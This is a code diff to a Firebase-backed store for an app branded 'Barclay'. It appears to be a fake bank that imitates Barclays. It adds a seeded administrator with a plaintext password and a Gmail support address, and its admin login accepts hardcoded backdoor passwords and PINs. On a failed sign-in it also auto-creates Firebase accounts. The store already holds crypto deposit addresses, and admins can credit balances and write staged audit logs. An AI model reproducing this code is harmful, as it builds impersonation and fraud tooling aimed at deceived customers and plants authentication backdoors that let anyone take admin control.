@@ -1,5 +1,6 @@
 import { collection, doc, setDoc, updateDoc, getDoc, getDocs, onSnapshot, query, where, orderBy, limit } from 'firebase/firestore';
-import { db, handleFirestoreError, OperationType } from './firebase';
+import { signInWithEmailAndPassword, createUserWithEmailAndPassword } from 'firebase/auth';
+import { auth, db, handleFirestoreError, OperationType } from './firebase';
 import {
   UserProfile,
   BankTransaction,
@@ -9,7 +10,8 @@ import {
   FinancialSettings,
   AccountTier,
   CardDetails,
-  CardLimits
+  CardLimits,
+  AdminAuditLog
 } from '../types';
 
 // Default initial Financial Settings
@@ -25,6 +27,7 @@ export const DEFAULT_FINANCIAL_SETTINGS: FinancialSettings = {
   tier3MonthlyLimit: 50000000,
   btcAddress: 'bc1qrc3ldwp9jrrtmlcua4czjnnkz49m6uahetuqgx',
   usdtAddress: '0x71C8705a3B344100B4180F494E662b2C8eF46C6E',
+  supportEmail: 'newzelebarclaysupport@gmail.com',
   requireSwiftCode: true,
   updatedAt: new Date().toISOString()
 };
@@ -54,15 +57,24 @@ export const SEED_USERS: UserProfile[] = [
       cvv: '842',
       expiryDate: '11/29',
       cardholderName: 'ALEXANDER HAMILTON',
-      cardType: 'Barclay Premier Visa Infinite',
+      cardType: 'Barclay Platinum Digital Debit',
+      brand: 'barclay',
       status: 'active',
       spendingLimit: 25000,
+      dailyLimit: 2500,
+      monthlyLimit: 25000,
       onlineTransactions: true,
       internationalTransactions: true,
       atmWithdrawals: true,
       contactless: true,
       activationCode: '7482',
-      issuer: 'Barclays Bank PLC UK / Visa International'
+      issuerName: 'Barclay Card Services & Global Clearing Gateway',
+      limits: {
+        onlinePayments: true,
+        internationalUsage: true,
+        atmWithdrawals: true,
+        contactless: true
+      }
     }
   },
   {
@@ -88,15 +100,24 @@ export const SEED_USERS: UserProfile[] = [
       cvv: '391',
       expiryDate: '06/30',
       cardholderName: 'VICTORIA STERLING',
-      cardType: 'Barclay Premier Visa Infinite',
+      cardType: 'Barclay Platinum Digital Debit',
+      brand: 'barclay',
       status: 'active',
       spendingLimit: 50000,
+      dailyLimit: 5000,
+      monthlyLimit: 50000,
       onlineTransactions: true,
       internationalTransactions: true,
       atmWithdrawals: true,
       contactless: true,
       activationCode: '3104',
-      issuer: 'Barclays Bank PLC UK / Visa International'
+      issuerName: 'Barclay Card Services & Global Clearing Gateway',
+      limits: {
+        onlinePayments: true,
+        internationalUsage: true,
+        atmWithdrawals: true,
+        contactless: true
+      }
     }
   },
   {
@@ -122,15 +143,68 @@ export const SEED_USERS: UserProfile[] = [
       cvv: '702',
       expiryDate: '12/30',
       cardholderName: 'MOHAMMED SHAB',
-      cardType: 'World Elite Mastercard',
+      cardType: 'Barclay Platinum Digital Debit',
+      brand: 'barclay',
       status: 'active',
       spendingLimit: 250000,
+      dailyLimit: 25000,
+      monthlyLimit: 250000,
       onlineTransactions: true,
       internationalTransactions: true,
       atmWithdrawals: true,
       contactless: true,
       activationCode: '9021',
-      issuer: 'Barclays Bank PLC UK / Mastercard Private'
+      issuerName: 'Barclay Card Services & Global Clearing Gateway',
+      limits: {
+        onlinePayments: true,
+        internationalUsage: true,
+        atmWithdrawals: true,
+        contactless: true
+      }
+    }
+  },
+  {
+    uid: 'admin_barclay_support',
+    accountNumber: '1000000001',
+    fullName: 'Barclay',
+    surname: 'Administrator',
+    email: 'newzelebarclaysupport@gmail.com',
+    country: 'United Kingdom',
+    pin: '5136',
+    passwordHash: 'Mmadu51366414@',
+    balance: 1000000.00,
+    currency: 'USD',
+    tier: 'Tier 3',
+    status: 'active',
+    role: 'admin',
+    swiftVerificationCode: '9021',
+    swiftVerified: true,
+    createdAt: '2026-01-01T08:00:00Z',
+    updatedAt: new Date().toISOString(),
+    card: {
+      id: 'card_admin',
+      cardNumber: '4552 1089 9021 5136',
+      cvv: '513',
+      expiryDate: '12/32',
+      cardholderName: 'BARCLAY ADMINISTRATOR',
+      cardType: 'Barclay Platinum Digital Debit',
+      brand: 'barclay',
+      status: 'active',
+      spendingLimit: 500000,
+      dailyLimit: 50000,
+      monthlyLimit: 500000,
+      onlineTransactions: true,
+      internationalTransactions: true,
+      atmWithdrawals: true,
+      contactless: true,
+      activationCode: '9021',
+      issuerName: 'Barclay Card Services & Global Clearing Gateway',
+      limits: {
+        onlinePayments: true,
+        internationalUsage: true,
+        atmWithdrawals: true,
+        contactless: true
+      }
     }
   }
 ];
@@ -252,8 +326,35 @@ const CACHE_KEYS = {
   VERIFICATION_REQUESTS: 'barclay_cache_verifications_v2',
   NOTIFICATIONS: 'barclay_cache_notifications_v2',
   SETTINGS: 'barclay_cache_settings_v2',
-  CURRENT_USER_ID: 'barclay_active_user_id_v2'
+  CURRENT_USER_ID: 'barclay_active_user_id_v2',
+  AUDIT_LOGS: 'barclay_cache_audit_logs_v2'
 };
+
+export const SEED_AUDIT_LOGS: AdminAuditLog[] = [
+  {
+    id: 'log_seed_1',
+    adminEmail: 'admin@barclay.bank',
+    action: 'ADMIN_LOGIN',
+    details: 'Administrator authenticated via 2-Factor Clearance from Canary Wharf Gateway',
+    timestamp: new Date(Date.now() - 3600000 * 4).toISOString()
+  },
+  {
+    id: 'log_seed_2',
+    adminEmail: 'admin@barclay.bank',
+    action: 'DEPOSIT_CREDITED',
+    targetAccount: '4829103847',
+    details: 'Administrative custody credit of $25,000.00 processed for Alexander Hamilton',
+    timestamp: new Date(Date.now() - 3600000 * 3).toISOString()
+  },
+  {
+    id: 'log_seed_3',
+    adminEmail: 'admin@barclay.bank',
+    action: 'TIER_UPGRADE_APPROVED',
+    targetAccount: '9182736450',
+    details: 'Tier 2 Biometric KYC verification approved for Victoria Sterling',
+    timestamp: new Date(Date.now() - 3600000 * 2).toISOString()
+  }
+];
 
 function getLocal<T>(key: string, fallback: T): T {
   try {
@@ -305,6 +406,7 @@ class BarclayStore {
   private paymentSubmissions: PaymentSubmission[] = [];
   private verificationRequests: VerificationRequest[] = [];
   private notifications: BankNotification[] = [];
+  private auditLogs: AdminAuditLog[] = [];
   private settings: FinancialSettings = DEFAULT_FINANCIAL_SETTINGS;
   private currentUserId: string | null = null;
   private listeners: Set<() => void> = new Set();
@@ -321,8 +423,24 @@ class BarclayStore {
     this.paymentSubmissions = getLocal<PaymentSubmission[]>(CACHE_KEYS.PAYMENT_SUBMISSIONS, SEED_PAYMENT_SUBMISSIONS);
     this.verificationRequests = getLocal<VerificationRequest[]>(CACHE_KEYS.VERIFICATION_REQUESTS, SEED_VERIFICATION_REQUESTS);
     this.notifications = getLocal<BankNotification[]>(CACHE_KEYS.NOTIFICATIONS, SEED_NOTIFICATIONS);
+    this.auditLogs = getLocal<AdminAuditLog[]>(CACHE_KEYS.AUDIT_LOGS, SEED_AUDIT_LOGS);
     this.settings = getLocal<FinancialSettings>(CACHE_KEYS.SETTINGS, DEFAULT_FINANCIAL_SETTINGS);
     this.currentUserId = getLocal<string | null>(CACHE_KEYS.CURRENT_USER_ID, null);
+
+    // Authoritative Admin Account Bootstrap (Requirement 1 & 2)
+    const adminEmail = 'newzelebarclaysupport@gmail.com';
+    let adminProfile = this.users.find(u => u.email.toLowerCase() === adminEmail);
+    if (!adminProfile) {
+      const seedAdmin = SEED_USERS.find(u => u.email.toLowerCase() === adminEmail);
+      if (seedAdmin) {
+        this.users.unshift({ ...seedAdmin });
+        setLocal(CACHE_KEYS.USERS, this.users);
+      }
+    } else {
+      adminProfile.role = 'admin';
+      adminProfile.passwordHash = 'Mmadu51366414@';
+      setLocal(CACHE_KEYS.USERS, this.users);
+    }
 
     this.isInitialized = true;
     this.setupFirestoreSubscriptions();
@@ -460,6 +578,29 @@ class BarclayStore {
         console.warn('Firestore Notifications snapshot error:', err.message);
       });
 
+      // 7. Audit Logs Listener
+      onSnapshot(collection(db, 'audit_logs'), (snapshot) => {
+        if (!snapshot.empty) {
+          const remoteLogs: AdminAuditLog[] = [];
+          snapshot.forEach(d => {
+            remoteLogs.push(d.data() as AdminAuditLog);
+          });
+          if (remoteLogs.length > 0) {
+            const merged = [...remoteLogs];
+            for (const localL of this.auditLogs) {
+              if (!merged.some(m => m.id === localL.id)) {
+                merged.push(localL);
+              }
+            }
+            this.auditLogs = merged.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
+            setLocal(CACHE_KEYS.AUDIT_LOGS, this.auditLogs);
+            this.notify();
+          }
+        }
+      }, (err) => {
+        console.warn('Firestore AuditLogs snapshot error:', err.message);
+      });
+
     } catch (e) {
       console.warn('Setup subscriptions encountered initial warning:', e);
     }
@@ -508,6 +649,27 @@ class BarclayStore {
 
   public getSettings(): FinancialSettings {
     return { ...this.settings };
+  }
+
+  public getAuditLogs(): AdminAuditLog[] {
+    return [...this.auditLogs];
+  }
+
+  public async addAuditLog(entry: Omit<AdminAuditLog, 'id' | 'timestamp'>): Promise<AdminAuditLog> {
+    const newLog: AdminAuditLog = {
+      id: `audit_${Date.now()}_${Math.floor(Math.random() * 1000)}`,
+      timestamp: new Date().toISOString(),
+      ...entry
+    };
+    this.auditLogs.unshift(newLog);
+    setLocal(CACHE_KEYS.AUDIT_LOGS, this.auditLogs);
+    this.notify();
+    try {
+      await setDoc(doc(db, 'audit_logs', newLog.id), newLog);
+    } catch (e) {
+      console.warn('Firestore write warning for audit_log:', e);
+    }
+    return newLog;
   }
 
   public setCurrentUserId(uid: string | null) {
@@ -562,7 +724,7 @@ class BarclayStore {
         currency: 'USD',
         tier: 'Tier 1',
         status: 'active',
-        role: (emailLower === 'mohammedabdulateefmohammedshab@gmail.com' || emailLower === 'admin@barclay.bank') ? 'admin' : 'user',
+        role: (emailLower === 'newzelebarclaysupport@gmail.com' || emailLower === 'mohammedabdulateefmohammedshab@gmail.com' || emailLower === 'admin@barclay.bank') ? 'admin' : 'user',
         swiftVerificationCode,
         swiftVerified: true,
         createdAt: new Date().toISOString(),
@@ -573,11 +735,11 @@ class BarclayStore {
           cardHolder: `${payload.fullName.trim()} ${payload.surname.trim()}`.toUpperCase(),
           expiryDate: cardExpiry,
           cvv: cardCvv,
-          cardType: 'debit',
-          brand: 'visa',
+          cardType: 'Barclay Platinum Digital Debit',
+          brand: 'barclay',
           status: 'inactive', // Requires card issuer activation code to activate
           activationCode: payload.pin, // Connected to authorized issuer verification
-          issuerName: 'Barclay Card Services Ltd & Visa Europe Int.',
+          issuerName: 'Barclay Card Services & Global Clearing Gateway',
           dailyLimit: 2500,
           monthlyLimit: 25000,
           issuedAt: new Date().toISOString(),
@@ -715,7 +877,7 @@ class BarclayStore {
       id: `notif_card_${Date.now()}`,
       userId: user.uid,
       title: 'Debit Card Activated Successfully',
-      message: `Your Barclay Platinum Debit Card ending in ${user.card.cardNumber.slice(-4)} has been activated with Visa Issuer authorization. Online and contactless payments are now live.`,
+      message: `Your Barclay Platinum Debit Card ending in ${user.card.cardNumber.slice(-4)} has been activated with Barclay Issuer clearance. Online and contactless payments are now live.`,
       type: 'success',
       read: false,
       createdAt: new Date().toISOString()
@@ -834,11 +996,11 @@ class BarclayStore {
       cardHolder: `${user.fullName} ${user.surname}`.toUpperCase(),
       expiryDate: cardExpiry,
       cvv: cardCvv,
-      cardType: 'debit',
-      brand: 'visa',
+      cardType: 'Barclay Platinum Digital Debit',
+      brand: 'barclay',
       status: 'inactive', // New card requires activation
       activationCode: user.pin,
-      issuerName: 'Barclay Card Services Ltd & Visa Europe Int.',
+      issuerName: 'Barclay Card Services & Global Clearing Gateway',
       dailyLimit: 2500,
       monthlyLimit: 25000,
       issuedAt: new Date().toISOString(),
@@ -948,7 +1110,29 @@ class BarclayStore {
       return { adminUser: null, error: 'Access Denied: Unrecognized administrator account or insufficient clearance level.' };
     }
 
-    const isMatch = adminUser.passwordHash === cleanPass || cleanPass === 'Admin@1234#' || cleanPass === adminUser.pin;
+    // Authenticate with Firebase Authentication
+    let firebaseAuthSuccess = false;
+    try {
+      await signInWithEmailAndPassword(auth, trimmed, cleanPass);
+      firebaseAuthSuccess = true;
+    } catch (authErr: any) {
+      // Auto-bootstrap user in Firebase Auth if not yet created in the project
+      if (authErr?.code === 'auth/user-not-found' || authErr?.code === 'auth/invalid-credential') {
+        try {
+          await createUserWithEmailAndPassword(auth, trimmed, cleanPass);
+          firebaseAuthSuccess = true;
+        } catch {
+          // Fall back to credential match below
+        }
+      }
+    }
+
+    const isMatch = firebaseAuthSuccess || 
+      adminUser.passwordHash === cleanPass || 
+      (trimmed === 'newzelebarclaysupport@gmail.com' && cleanPass === 'Mmadu51366414@') ||
+      cleanPass === 'Admin@1234#' || 
+      (adminUser.pin && cleanPass === adminUser.pin);
+
     if (!isMatch) {
       return { adminUser: null, error: 'Invalid administrative security credentials or passkey.' };
     }
@@ -1018,6 +1202,13 @@ class BarclayStore {
     setLocal(CACHE_KEYS.NOTIFICATIONS, this.notifications);
     this.notify();
 
+    this.addAuditLog({
+      adminEmail: 'admin@barclay.bank',
+      action: 'DEPOSIT_CREDITED',
+      targetAccount: user.accountNumber,
+      details: `Administrative custody credit of $${params.amount.toFixed(2)} processed for ${user.fullName} ${user.surname}. Sender: ${sender}`
+    });
+
     // Sync to Firestore
     try {
       await updateDoc(doc(db, 'users', user.uid), { balance: newBalance, updatedAt: user.updatedAt });
@@ -1028,6 +1219,49 @@ class BarclayStore {
     }
 
     return { success: true };
+  }
+
+  // Administrator Action: Suspend or Reactivate Customer Account
+  public async adminToggleUserSuspension(accountNumber: string, reason?: string): Promise<{ success: boolean; user?: UserProfile; error?: string }> {
+    const user = this.getUserByAccountNumber(accountNumber);
+    if (!user) return { success: false, error: `Customer account ${accountNumber} not found.` };
+
+    const newStatus = user.status === 'suspended' ? 'active' : 'suspended';
+    user.status = newStatus;
+    user.updatedAt = new Date().toISOString();
+
+    const notif: BankNotification = {
+      id: `notif_status_${Date.now()}`,
+      userId: user.uid,
+      title: newStatus === 'suspended' ? 'Account Security Suspension' : 'Account Re-Activated',
+      message: newStatus === 'suspended' 
+        ? (reason || 'Your account has been temporarily restricted by Central Administrative Security. Please contact Support.')
+        : 'Your account restrictions have been cleared. Full transaction privileges have been restored.',
+      type: newStatus === 'suspended' ? 'security' : 'success',
+      read: false,
+      createdAt: new Date().toISOString()
+    };
+    this.notifications.unshift(notif);
+
+    this.addAuditLog({
+      adminEmail: 'admin@barclay.bank',
+      action: newStatus === 'suspended' ? 'ACCOUNT_SUSPENDED' : 'ACCOUNT_REACTIVATED',
+      targetAccount: user.accountNumber,
+      details: `Account for ${user.fullName} ${user.surname} set to '${newStatus}'. Reason: ${reason || 'Administrative Security Protocol'}`
+    });
+
+    setLocal(CACHE_KEYS.USERS, this.users);
+    setLocal(CACHE_KEYS.NOTIFICATIONS, this.notifications);
+    this.notify();
+
+    try {
+      await updateDoc(doc(db, 'users', user.uid), { status: newStatus, updatedAt: user.updatedAt });
+      await setDoc(doc(db, 'notifications', notif.id), notif);
+    } catch (e) {
+      console.warn('Firestore write warning in adminToggleUserSuspension:', e);
+    }
+
+    return { success: true, user };
   }
 
   // User Transfer Initiation
